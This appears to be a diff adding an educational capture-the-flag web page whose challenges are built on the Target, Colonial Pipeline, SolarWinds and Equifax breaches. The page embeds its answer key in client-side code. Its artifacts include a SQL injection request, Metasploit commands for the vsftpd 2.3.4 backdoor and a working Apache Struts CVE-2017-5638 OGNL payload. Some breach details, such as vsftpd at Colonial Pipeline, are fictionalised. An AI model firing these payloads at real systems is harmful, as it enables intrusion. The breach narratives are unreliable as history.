@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>MCCoE — CTF Challenges</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet"/>
+<style>
+:root{--green:#00ff41;--gd:#00aa2a;--gk:#003d10;--red:#EE2207;--cyan:#00f5ff;--gold:#ffd700;--navy:#050510;--navy2:#0a0f0a;--text:#c8ffc8;--muted:rgba(0,255,65,0.45);--border:rgba(0,255,65,0.2)}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Rajdhani','Segoe UI',sans-serif;font-weight:500;background:var(--navy2);color:var(--text);min-height:100vh;overflow-x:hidden}
+body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(0,255,65,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,65,0.03) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0}
+header{position:relative;z-index:10;border-bottom:1px solid var(--border);background:linear-gradient(180deg,rgba(5,10,5,0.98),rgba(5,10,5,0.85));padding:0 2rem;display:flex;align-items:center;justify-content:space-between;height:64px}
+.logo{font-family:'Orbitron',sans-serif;font-size:1rem;font-weight:900;color:var(--gold);letter-spacing:2px;text-shadow:0 0 10px rgba(255,215,0,0.5)}
+.hero{position:relative;z-index:5;text-align:center;padding:48px 2rem 32px}
+.hero h1{font-family:'Orbitron',sans-serif;font-size:clamp(1.6rem,4vw,2.8rem);font-weight:900;color:var(--gold);text-shadow:0 0 20px rgba(255,215,0,0.4);margin-bottom:10px}
+.hero p{color:rgba(200,255,200,0.7);font-size:1rem;max-width:600px;margin:0 auto 20px}
+.score-bar{display:flex;justify-content:center;gap:32px;margin-top:16px}
+.score-item{text-align:center}
+.score-num{font-family:'Orbitron',sans-serif;font-size:1.8rem;font-weight:900;color:var(--gold)}
+.score-lbl{font-size:.75rem;color:var(--muted);text-transform:uppercase;letter-spacing:1px}
+.main{position:relative;z-index:5;max-width:1000px;margin:0 auto;padding:0 2rem 80px}
+.scenario-header{font-family:'Orbitron',sans-serif;font-size:.7rem;letter-spacing:3px;color:var(--cyan);text-transform:uppercase;margin:32px 0 12px;padding-bottom:8px;border-bottom:1px solid rgba(0,245,255,0.2)}
+.challenge-card{background:rgba(10,15,10,0.92);border:1px solid var(--border);border-radius:12px;padding:24px;margin-bottom:16px;transition:border-color .2s}
+.challenge-card.solved{border-color:var(--green);background:rgba(0,255,65,0.04)}
+.challenge-card.solved .c-title{color:var(--green)}
+.c-header{display:flex;align-items:flex-start;justify-content:space-between;gap:16px;margin-bottom:12px}
+.c-meta{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.c-num{font-family:'Share Tech Mono',monospace;font-size:.75rem;color:var(--muted);background:rgba(0,255,65,0.08);border:1px solid var(--border);padding:2px 8px;border-radius:3px}
+.c-pts{font-family:'Orbitron',sans-serif;font-size:.65rem;color:var(--gold);background:rgba(255,215,0,0.08);border:1px solid rgba(255,215,0,0.25);padding:2px 8px;border-radius:3px}
+.c-title{font-size:1.1rem;font-weight:700;color:#fff;margin-bottom:8px}
+.c-body{font-size:.92rem;color:rgba(200,255,200,0.8);line-height:1.6;margin-bottom:14px}
+.c-artifact{background:rgba(0,0,0,0.5);border:1px solid rgba(0,255,65,0.15);border-radius:6px;padding:14px 16px;font-family:'Share Tech Mono',monospace;font-size:.78rem;color:rgba(0,255,65,0.85);white-space:pre-wrap;line-height:1.7;margin-bottom:14px;overflow-x:auto}
+.c-task{background:rgba(0,245,255,0.04);border-left:3px solid var(--cyan);padding:10px 14px;border-radius:0 6px 6px 0;font-size:.88rem;color:rgba(200,255,255,0.9);margin-bottom:14px}
+.c-task strong{color:var(--cyan)}
+.hint-btn{background:none;border:1px solid rgba(255,215,0,0.3);color:rgba(255,215,0,0.7);font-size:.75rem;padding:4px 12px;border-radius:4px;cursor:pointer;font-family:'Rajdhani',sans-serif;transition:all .2s}
+.hint-btn:hover{background:rgba(255,215,0,0.08);color:var(--gold)}
+.hint-box{display:none;background:rgba(255,215,0,0.05);border:1px solid rgba(255,215,0,0.2);border-radius:6px;padding:10px 14px;font-size:.85rem;color:rgba(255,215,0,0.85);margin-top:10px}
+.flag-row{display:flex;gap:10px;align-items:center;margin-top:14px;flex-wrap:wrap}
+.flag-input{flex:1;min-width:220px;background:rgba(0,0,0,0.5);border:1px solid rgba(0,255,65,0.35);border-radius:6px;padding:9px 14px;color:var(--green);font-family:'Share Tech Mono',monospace;font-size:.88rem;outline:none}
+.flag-input::placeholder{color:rgba(0,255,65,0.3)}
+.flag-input:focus{border-color:var(--green);box-shadow:0 0 8px rgba(0,255,65,0.2)}
+.flag-input.wrong{border-color:var(--red);animation:shake .3s}
+.flag-input.right{border-color:var(--green);background:rgba(0,255,65,0.07)}
+@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
+.submit-flag{background:var(--gk);border:1px solid var(--gd);color:var(--green);font-family:'Orbitron',sans-serif;font-size:.65rem;letter-spacing:1px;padding:9px 18px;border-radius:6px;cursor:pointer;transition:all .2s;white-space:nowrap}
+.submit-flag:hover{background:rgba(0,61,16,0.8);border-color:var(--green)}
+.solved-badge{display:none;align-items:center;gap:8px;font-family:'Orbitron',sans-serif;font-size:.75rem;color:var(--green);font-weight:700}
+.solved-badge.show{display:flex}
+.wrong-msg{display:none;font-size:.8rem;color:var(--red);margin-top:6px}
+.wrong-msg.show{display:block}
+.progress-bar-wrap{background:rgba(0,255,65,0.08);border:1px solid var(--border);border-radius:8px;padding:16px 20px;margin-bottom:24px}
+.progress-label{font-size:.8rem;color:var(--muted);margin-bottom:8px;display:flex;justify-content:space-between}
+.progress-track{height:8px;background:rgba(0,255,65,0.1);border-radius:4px;overflow:hidden}
+.progress-fill{height:100%;background:linear-gradient(90deg,var(--gd),var(--green));border-radius:4px;transition:width .4s ease}
+.student-banner{position:relative;z-index:5;background:rgba(0,255,65,0.06);border-bottom:1px solid rgba(0,255,65,0.15);padding:8px 2rem;font-size:.8rem;color:var(--green);display:none;font-family:'Share Tech Mono',monospace}
+</style>
+
+<!-- Firebase -->
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<script>
+firebase.initializeApp({
+  apiKey:"AIzaSyBQN4m_Q_example_replace_with_real",
+  authDomain:"mccoe-platform.firebaseapp.com",
+  databaseURL:"https://mccoe-platform-default-rtdb.firebaseio.com",
+  projectId:"mccoe-platform",
+  storageBucket:"mccoe-platform.appspot.com",
+  messagingSenderId:"000000000000",
+  appId:"1:000000000000:web:0000000000000000"
+});
+const _db = firebase.database();
+</script>
+
+</head>
+<body>
+
+<header>
+  <div class="logo">MCCoE — CTF</div>
+  <div style="font-family:'Share Tech Mono',monospace;font-size:.75rem;color:var(--muted)">CAPTURE THE FLAG — 4 SCENARIOS · 12 FLAGS</div>
+  <div id="hdr-score" style="font-family:'Orbitron',sans-serif;font-size:.9rem;color:var(--gold)">0 pts</div>
+</header>
+
+<div id="student-banner" class="student-banner"></div>
+
+<div class="hero">
+  <h1>🚩 Capture The Flag</h1>
+  <p>Solve real-world cybersecurity puzzles based on the 4 incident case studies. Find every flag to complete the challenge.</p>
+  <div style="font-family:'Share Tech Mono',monospace;font-size:.8rem;color:rgba(0,255,65,0.5);margin-top:8px">Flag format: MCCoE{answer}</div>
+  <div class="score-bar">
+    <div class="score-item"><div class="score-num" id="score-pts">0</div><div class="score-lbl">Points</div></div>
+    <div class="score-item"><div class="score-num" id="score-flags">0</div><div class="score-lbl">Flags</div></div>
+    <div class="score-item"><div class="score-num" id="score-pct">0%</div><div class="score-lbl">Complete</div></div>
+  </div>
+</div>
+
+<div class="main">
+
+  <div class="progress-bar-wrap">
+    <div class="progress-label"><span>Overall Progress</span><span id="prog-text">0 / 12 flags captured</span></div>
+    <div class="progress-track"><div class="progress-fill" id="prog-fill" style="width:0%"></div></div>
+  </div>
+
+  <!-- ═══ SCENARIO 1: TARGET BREACH ═══ -->
+  <div class="scenario-header">📦 Scenario 1 — Target Breach (2013) · 150 pts</div>
+
+  <div class="challenge-card" id="c0">
+    <div class="c-header">
+      <div>
+        <div class="c-meta"><span class="c-num">CTF-01</span><span class="c-pts">50 PTS</span></div>
+        <div class="c-title">Third-Party Access</div>
+      </div>
+      <div class="solved-badge" id="badge0">✓ SOLVED</div>
+    </div>
+    <div class="c-body">Attackers gained initial access to Target's network through a third-party HVAC vendor. The vendor's name was embedded in a public contractor portal document — encoded to obscure it.</div>
+    <div class="c-artifact">Encoded contractor ID: RmF6aW8gVGVjaA==</div>
+    <div class="c-task"><strong>Task:</strong> Decode the Base64 string above. Submit the vendor name as the flag.</div>
+    <button class="hint-btn" onclick="toggleHint(0)">💡 Hint</button>
+    <div class="hint-box" id="hint0">Use a Base64 decoder. Try: atob('RmF6aW8gVGVjaA==') in your browser console (F12 → Console)</div>
+    <div class="flag-row">
+      <input class="flag-input" id="fi0" placeholder="MCCoE{...}" oninput="clearWrong(0)"/>
+      <button class="submit-flag" onclick="checkFlag(0)">SUBMIT FLAG</button>
+    </div>
+    <div class="wrong-msg" id="wrong0">Incorrect flag — try again</div>
+  </div>
+
+  <div class="challenge-card" id="c1">
+    <div class="c-header">
+      <div>
+        <div class="c-meta"><span class="c-num">CTF-02</span><span class="c-pts">50 PTS</span></div>
+        <div class="c-title">SQL Injection Payload</div>
+      </div>
+      <div class="solved-badge" id="badge1">✓ SOLVED</div>
+    </div>
+    <div class="c-body">Target's point-of-sale web interface was vulnerable to SQL injection. Attackers extracted the table containing customer payment data.</div>
+    <div class="c-artifact">GET /pos/query?id=1 UNION SELECT table_name,2,3 FROM information_schema.tables--
+HTTP/1.1 200 OK
+{"result":[["payment_cards","2","3"],["session_tokens","2","3"],["admin_users","2","3"]]}</div>
+    <div class="c-task"><strong>Task:</strong> Identify the table that contains customer payment data from the SQL response above. Submit it as the flag.</div>
+    <button class="hint-btn" onclick="toggleHint(1)">💡 Hint</button>
+    <div class="hint-box" id="hint1">Look at the first result returned. Which table name most directly corresponds to stolen card data?</div>
+    <div class="flag-row">
+      <input class="flag-input" id="fi1" placeholder="MCCoE{...}" oninput="clearWrong(1)"/>
+      <button class="submit-flag" onclick="checkFlag(1)">SUBMIT FLAG</button>
+    </div>
+    <div class="wrong-msg" id="wrong1">Incorrect flag — try again</div>
+  </div>
+
+  <div class="challenge-card" id="c2">
+    <div class="c-header">
+      <div>
+        <div class="c-meta"><span class="c-num">CTF-03</span><span class="c-pts">50 PTS</span></div>
+        <div class="c-title">Data Exfiltration Server</div>
+      </div>
+      <div class="solved-badge" id="badge2">✓ SOLVED</div>
+    </div>
+    <div class="c-body">After stealing 40 million card records, attackers moved data to an external FTP server. Analyze this firewall log to find the exfiltration destination IP.</div>
+    <div class="c-artifact">2013-12-11 02:14:33  192.168.1.50 → 10.0.0.1     FTP  ALLOW  (internal)
+2013-12-11 02:14:41  192.168.1.50 → 10.0.0.22    DNS  ALLOW  (internal)
+2013-12-11 02:14:55  192.168.1.50 → 96.27.170.30 FTP  ALLOW  (EXTERNAL!) 4.2GB
+2013-12-11 02:15:01  192.168.1.50 → 10.0.0.1     DNS  ALLOW  (internal)
+2013-12-11 02:15:44  192.168.1.50 → 10.0.0.22    HTTP ALLOW  (internal)</div>
+    <div class="c-task"><strong>Task:</strong> Identify the external IP address used to exfiltrate data. Submit it as the flag.</div>
+    <button class="hint-btn" onclick="toggleHint(2)">💡 Hint</button>
+    <div class="hint-box" id="hint2">Look for the connection flagged as (EXTERNAL!) with a large data transfer. Internal IPs start with 10. or 192.168.</div>
+    <div class="flag-row">
+      <input class="flag-input" id="fi2" placeholder="MCCoE{...}" oninput="clearWrong(2)"/>
+      <button class="submit-flag" onclick="checkFlag(2)">SUBMIT FLAG</button>
+    </div>
+    <div class="wrong-msg" id="wrong2">Incorrect flag — try again</div>
+  </div>
+
+  <!-- ═══ SCENARIO 2: COLONIAL PIPELINE ═══ -->
+  <div class="scenario-header">⛽ Scenario 2 — Colonial Pipeline (2021) · 150 pts</div>
+
+  <div class="challenge-card" id="c3">
+    <div class="c-header">
+      <div>
+        <div class="c-meta"><span class="c-num">CTF-04</span><span class="c-pts">50 PTS</span></div>
+        <div class="c-title">vsftpd Backdoor Port</div>
+      </div>
+      <div class="solved-badge" id="badge3">✓ SOLVED</div>
+    </div>
+    <div class="c-body">Colonial Pipeline ran a legacy vsftpd 2.3.4 FTP server. This version contains a backdoor that opens a shell on a specific port when triggered with a smiley face in the username.</div>
+    <div class="c-artifact">msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 172.20.0.20
+msf6 exploit(vsftpd_234_backdoor) > run
+
+[*] 172.20.0.20:21 - Banner: 220 vsFTPd 2.3.4
+[*] 172.20.0.20:21 - USER: 331 Please specify password.
+[+] 172.20.0.20:21 - Backdoor service has been spawned, handling...
+[+] 172.20.0.20:????  - UID: uid=0(root) gid=0(root)
+[*] Found shell.
+[*] Found shell.</div>
+    <div class="c-task"><strong>Task:</strong> Research vsftpd 2.3.4. What port number does the backdoor shell open on? Submit it as the flag.</div>
+    <button class="hint-btn" onclick="toggleHint(3)">💡 Hint</button>
+    <div class="hint-box" id="hint3">The backdoor in vsftpd 2.3.4 listens on port 6200. This is documented in the Metasploit module source and the original Rapid7 advisory.</div>
+    <div class="flag-row">
+      <input class="flag-input" id="fi3" placeholder="MCCoE{...}" oninput="clearWrong(3)"/>
+      <button class="submit-flag" onclick="checkFlag(3)">SUBMIT FLAG</button>
+    </div>
+    <div class="wrong-msg" id="wrong3">Incorrect flag — try again</div>
+  </div>
+
+  <div class="challenge-card" id="c4">
+    <div class="c-header">
+      <div>
+        <div class="c-meta"><span class="c-num">CTF-05</span><span class="c-pts">50 PTS</span></div>
+        <div class="c-title">CVE Identification</div>
+      </div>
+      <div class="solved-badge" id="badge4">✓ SOLVED</div>
+    </div>
+    <div class="c-body">Every known vulnerability has a CVE number. Identifying the correct CVE is the first step in understanding how to detect and defend against an attack.</div>
+    <div class="c-artifact">Vulnerability: vsftpd 2.3.4 smiley-face backdoor
+Affected versions: vsftpd 2.3.4 only
+Impact: Remote unauthenticated root shell
+CVSS Score: 10.0 (Critical)
+Published: 2011
+</div>
+    <div class="c-task"><strong>Task:</strong> What is the CVE number for the vsftpd 2.3.4 backdoor? Submit it as the flag.</div>
+    <button class="hint-btn" onclick="toggleHint(4)">&#x1F4A1; Hint</button>
+    <div class="hint-box" id="hint4">Search NVD (nvd.nist.gov) for "vsftpd 2.3.4 backdoor" or look it up in Metasploit module info. The year is 2011.</div>
+    <div class="flag-row">
+      <input class="flag-input" id="fi4" placeholder="MCCoE{...}" oninput="clearWrong(4)"/>
+      <button class="submit-flag" onclick="checkFlag(4)">SUBMIT FLAG</button>
+    </div>
+    <div class="wrong-msg" id="wrong4">Incorrect flag — try again</div>
+  </div>
+
+  <div class="challenge-card" id="c5">
+    <div class="c-header">
+      <div>
+        <div class="c-meta"><span class="c-num">CTF-06</span><span class="c-pts">50 PTS</span></div>
+        <div class="c-title">Weak Credentials</div>
+      </div>
+      <div class="solved-badge" id="badge5">&#x2713; SOLVED</div>
+    </div>
+    <div class="c-body">Colonial Pipeline attackers gained VPN access using a password found in a previously leaked credential database. The password violated basic security policy.</div>
+    <div class="c-artifact">Cracked hash from leaked database:
+Hash: 5f4dcc3b5aa765d61d8327deb882cf99
+Type: MD5
+
+Decoded: ???</div>
+    <div class="c-task"><strong>Task:</strong> Crack the MD5 hash above to find the compromised password. Submit it as the flag. (Hint: it is a very common password)</div>
+    <button class="hint-btn" onclick="toggleHint(5)">&#x1F4A1; Hint</button>
+    <div class="hint-box" id="hint5">MD5 hash 5f4dcc3b5aa765d61d8327deb882cf99 is one of the most commonly cracked hashes in the world. Try crackstation.net or think about what the most common password of all time is.</div>
+    <div class="flag-row">
+      <input class="flag-input" id="fi5" placeholder="MCCoE{...}" oninput="clearWrong(5)"/>
+      <button class="submit-flag" onclick="checkFlag(5)">SUBMIT FLAG</button>
+    </div>
+    <div class="wrong-msg" id="wrong5">Incorrect flag — try again</div>
+  </div>
+
+  <!-- SCENARIO 3: SOLARWINDS -->
+  <div class="scenario-header">&#x2601; Scenario 3 - SolarWinds (2020) - 150 pts</div>
+
+  <div class="challenge-card" id="c6">
+    <div class="c-header">
+      <div>
+        <div class="c-meta"><span class="c-num">CTF-07</span><span class="c-pts">50 PTS</span></div>
+        <div class="c-title">SUNBURST Malware Name</div>
+      </div>
+      <div class="solved-badge" id="badge6">&#x2713; SOLVED</div>
+    </div>
+    <div class="c-body">The SolarWinds attackers hid malicious code inside a legitimate software update. The malware was given a codename by security researchers at FireEye who discovered it.</div>
+    <div class="c-artifact">FireEye Threat Research Report (Dec 13, 2020)
+-------------------------------------------
+We have identified a global intrusion campaign that leverages
+a trojanized update to SolarWinds Orion software.
+
+The malware, which we have named ????????, is distributed as
+part of SolarWinds Orion software updates between March and
+June 2020 (versions 2019.4 through 2020.2.1).
+
+Initial access: Supply chain compromise
+Persistence: DLL hijacking in legitimate update process
+C2: Subdomain generation algorithm via avsvmcloud.com</div>
+    <div class="c-task"><strong>Task:</strong> Research the SolarWinds attack. What codename did FireEye give the SUNBURST malware? Submit it as the flag.</div>
+    <button class="hint-btn" onclick="toggleHint(6)">&#x1F4A1; Hint</button>
+    <div class="hint-box" id="hint6">FireEye named the backdoor after a celestial object. It was discovered in December 2020 and became one of the biggest supply chain attacks ever. Search "SolarWinds FireEye malware name 2020".</div>
+    <div class="flag-row">
+      <input class="flag-input" id="fi6" placeholder="MCCoE{...}" oninput="clearWrong(6)"/>
+      <button class="submit-flag" onclick="checkFlag(6)">SUBMIT FLAG</button>
+    </div>
+    <div class="wrong-msg" id="wrong6">Incorrect flag — try again</div>
+  </div>
+
+  <div class="challenge-card" id="c7">
+    <div class="c-header">
+      <div>
+        <div class="c-meta"><span class="c-num">CTF-08</span><span class="c-pts">50 PTS</span></div>
+        <div class="c-title">C2 Domain Discovery</div>
+      </div>
+      <div class="solved-badge" id="badge7">&#x2713; SOLVED</div>
+    </div>
+    <div class="c-body">SUNBURST used a domain generation algorithm to contact its command and control server. The C2 domain was discovered in DNS logs weeks after the initial infection.</div>
+    <div class="c-artifact">DNS Query Log - December 2020
+--------------------------------------
+corporate-dc01   dns.google.com        ALLOW
+corporate-ws04   windowsupdate.com     ALLOW
+corporate-srv02  avsvmcloud.com        ALLOW   [FLAGGED: unknown external domain]
+corporate-dc01   api.solarwinds.com    ALLOW
+corporate-ws11   avsvmcloud.com        ALLOW   [FLAGGED: unknown external domain]
+corporate-srv05  github.com            ALLOW</div>
+    <div class="c-task"><strong>Task:</strong> Identify the SUNBURST command and control domain from the DNS logs above. Submit it as the flag.</div>
+    <button class="hint-btn" onclick="toggleHint(7)">&#x1F4A1; Hint</button>
+    <div class="hint-box" id="hint7">Look for the domain that appears multiple times and is flagged as unknown external. It was the actual C2 domain used in the SolarWinds attack.</div>
+    <div class="flag-row">
+      <input class="flag-input" id="fi7" placeholder="MCCoE{...}" oninput="clearWrong(7)"/>
+      <button class="submit-flag" onclick="checkFlag(7)">SUBMIT FLAG</button>
+    </div>
+    <div class="wrong-msg" id="wrong7">Incorrect flag — try again</div>
+  </div>
+
+  <div class="challenge-card" id="c8">
+    <div class="c-header">
+      <div>
+        <div class="c-meta"><span class="c-num">CTF-09</span><span class="c-pts">50 PTS</span></div>
+        <div class="c-title">MITRE ATT&amp;CK Technique</div>
+      </div>
+      <div class="solved-badge" id="badge8">&#x2713; SOLVED</div>
+    </div>
+    <div class="c-body">SUNBURST used a specific MITRE ATT&amp;CK technique to gain access through the software supply chain. Every technique in ATT&amp;CK has a unique ID number.</div>
+    <div class="c-artifact">Attack vector: Compromise of SolarWinds build process
+Delivery: Malicious DLL distributed via official software update
+Result: Attackers had access to 18,000+ organizations
+MITRE category: Initial Access
+Sub-technique: Compromise Software Supply Chain
+MITRE ID: T1195.???</div>
+    <div class="c-task"><strong>Task:</strong> What is the full MITRE ATT&amp;CK technique ID for "Supply Chain Compromise: Compromise Software Supply Chain"? Submit it as the flag.</div>
+    <button class="hint-btn" onclick="toggleHint(8)">&#x1F4A1; Hint</button>
+    <div class="hint-box" id="hint8">Go to attack.mitre.org and search for "Supply Chain Compromise". Find the sub-technique for software supply chain specifically. The parent is T1195, the sub-technique number is .002.</div>
+    <div class="flag-row">
+      <input class="flag-input" id="fi8" placeholder="MCCoE{...}" oninput="clearWrong(8)"/>
+      <button class="submit-flag" onclick="checkFlag(8)">SUBMIT FLAG</button>
+    </div>
+    <div class="wrong-msg" id="wrong8">Incorrect flag — try again</div>
+  </div>
+
+  <!-- SCENARIO 4: EQUIFAX -->
+  <div class="scenario-header">&#x1F4CA; Scenario 4 - Equifax (2017) - 150 pts</div>
+
+  <div class="challenge-card" id="c9">
+    <div class="c-header">
+      <div>
+        <div class="c-meta"><span class="c-num">CTF-10</span><span class="c-pts">50 PTS</span></div>
+        <div class="c-title">Vulnerable Framework CVE</div>
+      </div>
+      <div class="solved-badge" id="badge9">&#x2713; SOLVED</div>
+    </div>
+    <div class="c-body">Equifax ran an unpatched Apache Struts web application. A critical vulnerability in Struts allowed attackers to execute code remotely just by sending a crafted HTTP Content-Type header.</div>
+    <div class="c-artifact">Captured HTTP Request - May 13, 2017
+--------------------------------------
+POST /struts2-showcase/fileupload/doUpload.action HTTP/1.1
+Host: 143.244.205.xxx
+Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))).(#ros)}</div>
+    <div class="c-task"><strong>Task:</strong> What is the CVE number for the Apache Struts 2 remote code execution vulnerability exploited in the Equifax breach? Submit it as the flag.</div>
+    <button class="hint-btn" onclick="toggleHint(9)">&#x1F4A1; Hint</button>
+    <div class="hint-box" id="hint9">Search NVD for "Apache Struts 2 remote code execution 2017 Content-Type". The vulnerability was patched in March 2017 but Equifax failed to apply it. Year is 2017.</div>
+    <div class="flag-row">
+      <input class="flag-input" id="fi9" placeholder="MCCoE{...}" oninput="clearWrong(9)"/>
+      <button class="submit-flag" onclick="checkFlag(9)">SUBMIT FLAG</button>
+    </div>
+    <div class="wrong-msg" id="wrong9">Incorrect flag — try again</div>
+  </div>
+
+  <div class="challenge-card" id="c10">
+    <div class="c-header">
+      <div>
+        <div class="c-meta"><span class="c-num">CTF-11</span><span class="c-pts">50 PTS</span></div>
+        <div class="c-title">Stolen Data Type</div>
+      </div>
+      <div class="solved-badge" id="badge10">&#x2713; SOLVED</div>
+    </div>
+    <div class="c-body">Equifax exposed 147 million Americans' most sensitive personal data. Decode this hex string found in the attacker's exfiltration script to identify the most critical data type stolen.</div>
+    <div class="c-artifact">Hex found in attacker script:
+73 6f 63 69 61 6c 5f 73 65 63 75 72 69 74 79 5f 6e 75 6d 62 65 72</div>
+    <div class="c-task"><strong>Task:</strong> Decode the hex string above. Submit the decoded text as the flag (use underscores as shown).</div>
+    <button class="hint-btn" onclick="toggleHint(10)">&#x1F4A1; Hint</button>
+    <div class="hint-box" id="hint10">Convert each hex pair to ASCII. In your browser console: decodeURIComponent('%73%6f%63%69%61%6c%5f%73%65%63%75%72%69%74%79%5f%6e%75%6d%62%65%72') — or use an online hex decoder.</div>
+    <div class="flag-row">
+      <input class="flag-input" id="fi10" placeholder="MCCoE{...}" oninput="clearWrong(10)"/>
+      <button class="submit-flag" onclick="checkFlag(10)">SUBMIT FLAG</button>
+    </div>
+    <div class="wrong-msg" id="wrong10">Incorrect flag — try again</div>
+  </div>
+
+  <div class="challenge-card" id="c11">
+    <div class="c-header">
+      <div>
+        <div class="c-meta"><span class="c-num">CTF-12</span><span class="c-pts">50 PTS</span></div>
+        <div class="c-title">Days Undetected</div>
+      </div>
+      <div class="solved-badge" id="badge11">&#x2713; SOLVED</div>
+    </div>
+    <div class="c-body">One of the most damning facts about the Equifax breach was how long attackers went undetected inside their network after initial exploitation.</div>
+    <div class="c-artifact">Timeline:
+  May 13, 2017  - Initial exploitation of Apache Struts
+  May 13, 2017  - First data exfiltration begins
+  July 29, 2017 - Equifax security team detects anomalous traffic
+  Sept 7, 2017  - Equifax publicly discloses the breach
+
+Question: How many days did attackers have undetected access?
+(From first exploitation to detection)</div>
+    <div class="c-task"><strong>Task:</strong> Calculate the number of days between initial exploitation and detection. Submit it as the flag in the format MCCoE{XX_days}.</div>
+    <button class="hint-btn" onclick="toggleHint(11)">&#x1F4A1; Hint</button>
+    <div class="hint-box" id="hint11">Count from May 13 to July 29. May has 31 days, so 31-13=18 days remaining in May, plus all of June (30 days), plus 29 days in July.</div>
+    <div class="flag-row">
+      <input class="flag-input" id="fi11" placeholder="MCCoE{...}" oninput="clearWrong(11)"/>
+      <button class="submit-flag" onclick="checkFlag(11)">SUBMIT FLAG</button>
+    </div>
+    <div class="wrong-msg" id="wrong11">Incorrect flag — try again</div>
+  </div>
+
+</div><!-- end .main -->
+
+<script>
+const _params      = new URLSearchParams(window.location.search);
+const _studentName = _params.get('name') || '';
+const _studentId   = _params.get('id')   || '';
+const _fbKey       = _studentId ? _studentId.replace(/[.#$[\]]/g, '_') : null;
+
+if (_studentName) {
+  const b = document.getElementById('student-banner');
+  b.textContent = 'CTF Session: ' + _studentName + '  —  Progress saved to Admin Tracker';
+  b.style.display = 'block';
+}
+
+// Flag answers (normalized lowercase, no spaces)
+const FLAGS = [
+  'mccoe{fazio_tech}',
+  'mccoe{payment_cards}',
+  'mccoe{96.27.170.30}',
+  'mccoe{port_6200}',
+  'mccoe{cve-2011-2523}',
+  'mccoe{password}',
+  'mccoe{sunburst}',
+  'mccoe{avsvmcloud.com}',
+  'mccoe{t1195.002}',
+  'mccoe{cve-2017-5638}',
+  'mccoe{social_security_number}',
+  'mccoe{78_days}'
+];
+
+const PTS = [50,50,50,50,50,50,50,50,50,50,50,50];
+const solved = new Set();
+let totalPts = 0;
+
+function normalize(s){ return s.trim().toLowerCase().replace(/\s+/g,''); }
+
+function checkFlag(idx) {
+  if (solved.has(idx)) return;
+  const input = document.getElementById('fi' + idx);
+  const val   = normalize(input.value);
+  if (val === FLAGS[idx]) {
+    solved.add(idx);
+    totalPts += PTS[idx];
+    input.classList.remove('wrong');
+    input.classList.add('right');
+    input.disabled = true;
+    document.getElementById('badge' + idx).classList.add('show');
+    document.getElementById('c' + idx).classList.add('solved');
+    document.getElementById('wrong' + idx).classList.remove('show');
+    updateScoreboard();
+    saveProgress();
+  } else {
+    input.classList.add('wrong');
+    document.getElementById('wrong' + idx).classList.add('show');
+    setTimeout(() => input.classList.remove('wrong'), 400);
+  }
+}
+
+function clearWrong(idx) {
+  document.getElementById('wrong' + idx).classList.remove('show');
+  document.getElementById('fi' + idx).classList.remove('wrong');
+}
+
+function toggleHint(idx) {
+  const h = document.getElementById('hint' + idx);
+  h.style.display = h.style.display === 'block' ? 'none' : 'block';
+}
+
+function updateScoreboard() {
+  const n = solved.size;
+  const pct = Math.round(n / 12 * 100);
+  document.getElementById('score-pts').textContent  = totalPts;
+  document.getElementById('score-flags').textContent = n;
+  document.getElementById('score-pct').textContent  = pct + '%';
+  document.getElementById('hdr-score').textContent  = totalPts + ' pts';
+  document.getElementById('prog-fill').style.width  = pct + '%';
+  document.getElementById('prog-text').textContent  = n + ' / 12 flags captured';
+}
+
+function saveProgress() {
+  if (!_fbKey) return;
+  const data = {
+    name: _studentName, id: _studentId,
+    points: totalPts, flagsCaptured: solved.size,
+    lastActivity: new Date().toISOString()
+  };
+  FLAGS.forEach((_, i) => data['flag' + i] = solved.has(i));
+  _db.ref('mccoe_ctf/' + _fbKey).set(data);
+}
+
+function loadProgress() {
+  if (!_fbKey) return;
+  _db.ref('mccoe_ctf/' + _fbKey).once('value', snap => {
+    const d = snap.val();
+    if (!d) return;
+    FLAGS.forEach((_, i) => {
+      if (d['flag' + i]) {
+        solved.add(i);
+        totalPts += PTS[i];
+        const input = document.getElementById('fi' + i);
+        input.value = FLAGS[i];
+        input.classList.add('right');
+        input.disabled = true;
+        document.getElementById('badge' + i).classList.add('show');
+        document.getElementById('c' + i).classList.add('solved');
+      }
+    });
+    updateScoreboard();
+  });
+}
+
+// Enter key submits
+document.querySelectorAll('.flag-input').forEach((inp, i) => {
+  inp.addEventListener('keydown', e => { if (e.key === 'Enter') checkFlag(i); });
+});
+
+loadProgress();
+</script>
+</body>
+</html>
